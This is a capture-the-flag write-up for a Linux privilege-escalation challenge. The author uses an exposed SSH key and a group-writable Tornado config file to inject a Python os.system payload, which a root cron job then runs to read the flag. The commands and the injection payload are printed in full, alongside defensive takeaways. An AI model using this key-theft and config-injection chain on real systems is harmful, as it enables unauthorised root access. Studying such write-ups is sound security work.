# CTF Writeup: Vuln file permission

## Challenge Information
- **Challenge Name**: Vuln file permission
- **Points**: 1000
- **Category**: Privilege Escalation / File Permission Vulnerability

## Initial Reconnaissance

After connecting to the SSH instance with the provided credentials (`pen`/`d649b7167cb34be49863eb0a5a483225`), I began by exploring the system to understand the attack surface.

### Finding the Flag
```bash
$ find / -name "*flag*" -type f 2>/dev/null
/flag.txt
```

The flag file exists at `/flag.txt` but is only readable by root:
```bash
$ ls -la /flag.txt
-r-x------ 1 root root 42 Sep  9 11:44 /flag.txt
```

### Discovering File Permission Vulnerabilities

I searched for files with unusual permissions that could be exploited:

```bash
$ find / -type f -perm -g+w -not -path "/proc/*" -not -path "/sys/*" 2>/dev/null
/var/log/lastlog
/var/log/wtmp
/var/log/btmp
/etc/app/app.conf
```

The `/etc/app/app.conf` file caught my attention:
```bash
$ ls -la /etc/app/app.conf
-rw-rw-r-- 1 root dev 25 Sep  9 04:16 /etc/app/app.conf
```

This file is:
- Owned by `root` but group is `dev`
- Group-writable (`rw-rw-r--`)
- Contains configuration data

### Finding SSH Keys

I discovered an SSH private key in the `/home/dev/` directory:
```bash
$ ls -la /home/dev/
-rw-r-xr-x 1 dev  dev  1831 Sep  9 11:44 id_rsa.backup
```

The key has read permissions for all users (`-rw-r-xr-x`), allowing me to extract it and use it to connect as the `dev` user.

### Privilege Escalation via SSH Key

Using the extracted SSH key, I connected as the `dev` user:
```bash
$ ssh -i /home/dev/id_rsa.backup dev@localhost
```

Now I had group `dev` membership, which allowed me to write to `/etc/app/app.conf`.

### Discovering the Application

I found a cron job that runs a Python application with root privileges:
```bash
$ cat /etc/cron.d/tornado
* * * * * root /usr/bin/python3 /opt/app/server.py >> /var/log/app/tornado_cron.log 2>&1
```

The application code at `/opt/app/server.py`:
```python
import os
import tornado.ioloop
import tornado.web
from tornado.options import define, options, parse_config_file

define("port", default=8000, help="Port to listen on")
define("debug", default=False, help="Run in debug mode")
define("duration", default=5.0, help="Seconds before shutdown")

class MainHandler(tornado.web.RequestHandler):
    def get(self):
        self.write("Hello, Tornado!")

def make_app():
    return tornado.web.Application(
        [(r"/", MainHandler)],
        debug=options.debug,
    )

if __name__ == "__main__":
    conf_path = "/etc/app/app.conf"
    try:
        parse_config_file(conf_path)
    except Exception as e:
        print(f"[-] Error: {e}")
        pass

    app = make_app()
    app.listen(options.port)
    print(f"[+] Starting server on http://localhost:{options.port}/ (debug={options.debug})")

    io = tornado.ioloop.IOLoop.current()
    io.call_later(float(options.duration), io.stop)
    io.start()
    print("[*] Server stopped.")
```

### The Vulnerability

The application uses `parse_config_file()` from Tornado to read configuration from `/etc/app/app.conf`. This function can execute arbitrary Python code when parsing configuration files.

### Exploitation

Since I could write to `/etc/app/app.conf` as the `dev` user, I injected malicious Python code:

```bash
$ cat > /etc/app/app.conf << 'EOF'
port = 8888
debug = True
__import__("os").system("cat /flag.txt > /tmp/flag_output.txt")
EOF
```

The injected code:
1. Sets the port to 8888
2. Enables debug mode
3. Executes a system command to read the flag and write it to `/tmp/flag_output.txt`

### Waiting for Execution

The cron job runs every minute, so I waited for the next execution. After a short wait, I checked for the output file:

```bash
$ ls -la /tmp/
-rw-r--r-- 1 root root   42 Sep 13 01:19 flag_output.txt
```

### Flag Extraction

```bash
$ cat /tmp/flag_output.txt
cybercon{lets_abuse_vuln_f1le_perm1ii10n}
```

## Summary

This challenge demonstrated a classic file permission vulnerability combined with code injection:

1. **File Permission Issue**: The `/etc/app/app.conf` file was group-writable by the `dev` group
2. **SSH Key Exposure**: The SSH private key was readable by all users
3. **Code Injection**: The application used `parse_config_file()` without proper input validation
4. **Privilege Escalation**: A cron job ran the vulnerable application with root privileges

## Flag
**cybercon{lets_abuse_vuln_f1le_perm1ii10n}**

## Key Takeaways

- Always check file permissions, especially for configuration files
- Never store SSH private keys with world-readable permissions
- Validate and sanitize configuration file inputs
- Be cautious when using functions that can execute arbitrary code
- Regular security audits of file permissions and access controls are essential
